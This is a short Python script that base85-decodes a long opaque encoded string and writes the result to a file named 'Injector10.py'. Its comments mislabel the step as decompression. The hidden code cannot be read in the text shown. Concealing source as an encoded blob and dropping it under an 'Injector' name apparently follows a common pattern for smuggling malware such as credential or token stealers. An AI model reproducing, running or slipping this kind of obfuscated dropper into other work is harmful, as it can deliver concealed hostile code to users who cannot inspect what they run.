
import base64

obs = r'Wq4&{C}VGAWn*(LWMyM-WMwE~VRL0RG%jK>He_XEZ)9aCawj%5H#jymHZw9fHZwLxHZ(RhHZwOfGDS8tHZ?XgHbyoyHZ?LhHZnFbH#0UhGd43cGDS8rGcz+XHZ(RhHZwLxHZ(RhGB`IfGB-3tH8wLeG&eLtH90jwG&wXxG(|NyH8(UlH9<5(G&D3uG(<HxG&eLkH9<5(G&D3tGc`3cG&eLtG(t2qG&3|rG&VIsH8(UuG(|NsH8nIgH9<8pG&D3sG(|KtG&M9tH8wReH8(RhH9<5qG&VFgG%__oG&3|tH8(UeH8M0fG&VFuG&VFfH8wOtG(t2%G&VFsG&D3ZG)6Q+G(<E*G%+<fG&eOdH8M3bH8wOwG(|K+G&eLvH8(UgH9<5vG&M6cH8nLeH8C?XG(t2*Gc`3cG&MCbH8nLfH8?axG(|HtG&eIgGc`3cG(<EvG(j{$G&nRdH90jwH8V6pH9<2oG&eLiGcz<oH8M0tH8wOvH8eCeG)6Q-H8nIrH8C|oG&M9tGc_|aG%_?oG(<BrH8eCgH8(XgH8?auG(j~uH8(UhG(<HrH9<5+G(j~oH8?dhG)6QuH90gvH8wOeG&VFdG(|KsG)6QzH8M3cH8?dfH8eCsGcq(eG&M6aH8nFfH8wOeH8wOiG&VFhH8(XiH8C_nH8eCqH8wOtG&VIeG(|KsG(<EvG(j{&G&nRwH8(UuH90gxG&wUfG&VFwH8M0pG(t2&G%_?fH8eCaGcz?oH8C_pG(j~tH8?amH8nFcG&D3fG&VIgG&VFuH8nLfG(|K*G(j~rH8(UlH8wOeG(|K<H8M0oH8(XiH90jwH8M0rH8wRiH8?dfH8eCdG&3|gGc`0eG&D3ZH90dgG($8(H9<5pG&VFfGcq+nH8M0pG%_?nG&VFjH8M3cG(<E+G&MCjH8wOvH8(UfH8V6tH8M0sG&eIcH8e9aH8nIrG(j^oH8wOgG(<E)G&3|eG(j{%G&MCbH8V9bH8(UuG(|K+H8wRhGd46rG(<E)H8M0bG&nRwH8(XgG&M9iG(j{qG&eLtH8wOfG&M9uG(|KuH8(UyH83<mGc`0dGc+|dH8V9cG(t2vGej~sGC49iGC3zHDJc'

# Decompress the obfuscated code
decode1 = base64.b85decode(obs)

# Decode the decompressed code
decoded_code = decode1.decode()

# Now you have the decoded and decompressed code available in the `decoded_code` variable

# Save the decompressed code to a file
output_file = "Injector10.py"  # Specify the desired output file name

with open(output_file, "w") as file:
    file.write(decoded_code)
    
